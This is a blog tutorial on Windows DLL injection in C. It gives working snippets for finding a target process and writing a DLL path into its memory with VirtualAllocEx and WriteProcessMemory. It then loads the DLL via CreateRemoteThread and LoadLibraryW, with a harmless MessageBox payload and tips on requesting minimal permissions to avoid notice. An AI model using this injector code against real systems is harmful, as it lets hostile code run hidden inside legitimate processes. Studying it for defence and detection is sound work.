---
title: Injecting DLLs in C
date: 2024-03-21T01:00:46+02:00
draft: false
tags:
  - C
  - DLL
  - MalwareDev
  - Windows
categories:
  - Guide
cover:
  image: "<https://i.ibb.co/K0HVPBd/paper-mod-profilemode.png>"
  # can also paste direct link from external site
  # ex. https://i.ibb.co/K0HVPBd/paper-mod-profilemode.png
  alt: "<alt text>"
  caption: "<text>"
---


Hey folks, its been a while since i last posted anything on the blog but i am holding myself accountable and gonna be posting again regularly ;)
enough of that and let's talk about some DLL injection!
I will explain as much as possible without going onto a lot of tangents so further reading is always encouraged.
Of course *this is for educational purposes only* blah blah.

## DLL Injection???

![hackerman](hackerman.webp#center)

DLL injection is a "sneaky" way to insert our code in the address space of the target process thereby executing our code! So when our malicious code executes it is not our process that is causing the harm and of course it's notepad! Yet it is not as fool proof -hence "sneaky"- as an EDR can detect the injection attempt with the sequence Win32 API calls.

> Of course evading an EDR is not impossible (e.g. API Hooking).

## Don't You Mean DLL Hijacking?

While both techniques have the same end-goal in mind (Running our DLL in another process) each of them take a different path to get there. DLL hijacking abuses the [Dynamic-link library search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order) when the a legitimate binary searches for the legitimate DLL to load it will find the malicious DLL first thereby executing the malicious code and this technique is very common in phishing attacks.

## How Does it Work?

I created a humble diagram below sums the steps you would take to to pull off a DLL injection but before we further apply the steps in the diagram there is a perquisite we need to know which is the PID of the target process, the way i would go for this is to use [CreateToolhelp32Snapshot](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot), [Process32First](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first) and [Process32Next](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next) to get a list of the running processes iterate through them till you get the process find the name of the process you're looking for that would be something like this:

```C
	PROCESSENTRY32 currentProcess;
	HANDLE Hsnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (Hsnapshot == INVALID_HANDLE_VALUE) {
		printf("couldn't take snapshot\n");
		return 1;
	}

	currentProcess.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(Hsnapshot, &currentProcess)) { 
		printf("couldn't access first process!\n");
		CloseHandle(Hsnapshot);
		return 1;
	}

	while (Process32Next(Hsnapshot, &currentProcess) && wcscmp(&currentProcess.szExeFile, targetBin)) {
	}

	_tprintf(TEXT("\nFOUND THE PROCESS:\t%s"), currentProcess.szExeFile);
	_tprintf(TEXT("\nProcess ID:\t0x%08X\n"), currentProcess.th32ProcessID);

	int targetPID = currentProcess.th32ProcessID;

	if (targetPID == 0) {
		printf("couldn't get PID");
		CloseHandle(Hsnapshot);
		return 1;
	}

	return targetPID;
	CloseHandle(Hsnapshot);
} 
```

So what this basically does is take a snapshot of running processes then we would iterate through them till we hit our targetBin , which is a defined process i declared above and i print it as a sanity check
**OR** when the Process32Next() returns `FALSE` which means it failed to get the next process and for simplify we will assume that it means that he hit the end of our process list which would mean that it failed to get the next process.

> Note that the [PROCESSENTRY32](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32?source=recommendations) is a structure for  defining a process's information when we the snapshot was taken as you might guess we kinda need that.

![Diagram](DLLInjection75.webp#center)

Looking at our diagram the first step is to call [OpenProcess()](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) with our newly acquired PID ;)

```C
HANDLE hTarget = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD, FALSE, dwPID);
```

The first part is fairly straightforward with us calling `OpenProcess` allowing us to get handle to our target process that we can use to allocate memory and more in the next steps.
it's worth to note that it's good practice to request as little permissions as you can as you would hopefully not raise much suspicion, so instead of calling `PROCESS_ALL_ACCESS` for the first parameter we can call:

- `PROCESS_VM_WRITE` to allocate memory in the target process.
- `PROCESS_VM_OPERATION` to actually use the allocated memory space.
- `PROCESS_CREATE_THREAD` to eventual create our remote thread that will run our DLL.

Rest of the permissions [here](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)

```C
LPVOID buffer = VirtualAllocEx(HTarget, 0, sizeof(DLLPath), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
```

Now in the second phase we want to allocate some space in the target's memory address space and we can achieve that by `VirtualAllocEx`, the EX stands for extended as the different between `VirtualAlloc` and `VirtualAllocEx` is that the second one is used for allocating space in another process which is EXACTLY what we are doing!

> Note that the space allocated by [VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) is initialized by zeros and the actually physical pages are not allocated until we actually access/use them as we passed `MEM_COMMIT` as the allocation type.

Something i found confusing at first is the size of the memory allocation let's take a look at the example above and assume we have our path for the DLL something like:

```C
wchar_t DLLPath[] = TEXT("C:\\Users\\vog\\source\\repos\\Trial_DLL\\x64\\Debug\\Trial_DLL.dll");

```

So when specifying the size to allocate in bytes we are specifying the **size of the DLL path** not the actual size of the DLL file, meaning we are allocating enough space in the target process to store the path of our DLL in the target process's memory space. We are not loading the DLL file into the target process ourselves we are letting the target process do the dirty work for us as we are going to see in a bit.

Finally the `VirutalAllocEx` returns the start address(pointer) of our newly acquired buffer in the target process!

![sizeof.png](sizeof.png)

```C
WriteProcessMemory(HTarget, buffer, (LPVOID)DLLPath, sizeof(DLLPath), 0)
```

Next we just write the the data into the buffer we just allocated.

```C
LPTHREAD_START_ROUTINEthreatStartRoutineAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "LoadLibraryW")
```

Now before creating our thread we need to define its behavior(routine)upon running, we are basically telling the thread that it should look run `LoadLibraryW` upon running by locating it's address in the Kernel32.dll.

```C
CreateRemoteThread(HTarget, 0, 0, threatStartRoutineAddress, buffer, 0, 0);
```

Lastly we're finally calling `CreateRemoteThread` to execute our DLL in the target process with our `LPTHREAD_START_ROUTINE` pointing to the LoadLibrary that will load the DLL from the path stored in the buffer.

## What's inside a DLL?

Now, what happens when the target process finally calls the DLL? How will it know what to do with it? I mean it was definetly not expecting our DLL in the first place.

Now comes DLLMain.
DLLs have useful function that serves similiar purose like the main we find in C/++/#, let's take a look:

```C
// dllmain.c : Defines the entry point for the DLL application.

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved

)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		MessageBoxW(
			0,       //[in, optional] HWND hWnd,//
			L"TEXT", //[in, optional] LPCTSTR lpText,//
			L"TITLE", //[in, optional] LPCTSTR lpCaption, //
			1        //[in]UINT uType//
		);
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
```
Now lets take a look at the switch cases and in particular `DLL_PROCESS_ATTACH` case will automatically execute when the DLL is loaded

```C
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	//code to execute when the DLL is loaded
	//
	//
	break;

```

## Things to Consider

### Error Checking habits

Something that will save you a lot of time when things break -which they always will- is putting the time to code handling functions that checks the return value of the API calls. A very useful resource i found was [Retrieving the Last-Error Code](https://learn.microsoft.com/en-us/windows/win32/debug/retrieving-the-last-error-code)
And calling it after you error check.
For Example:

```C
	LPVOID buffer = VirtualAllocEx(HTarget, 0, sizeof(DLLPath), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (buffer == NULL) {
		//CLOSE BUFFER
		ErrorExit(TEXT("VirtualAllocEx"));
	}
```

After calling the `VirtualAllocEX` it's wise to check if anything was actually allocated by checking if the buffer isn't equal to null and if it is then something definitely went wrong there.

If you are not sure what the function should return just google it and the first result should be MSDN which covers almost everything pretty well.

### Process Architecture

Depending on the process architecture and if it's a official microsoft process it maybe harder to inject the DLL.

For example if our injector process is 32 bit and the target is 64 bit or vise versa the injection cannot work.

## Goodbye

Thanks for tunning in! I hope you enjoyed the blog post and found it useful. Your thoughts and suggestions are super important to me, so if you have any feedback or suggestions Don't hesitate to reach out.
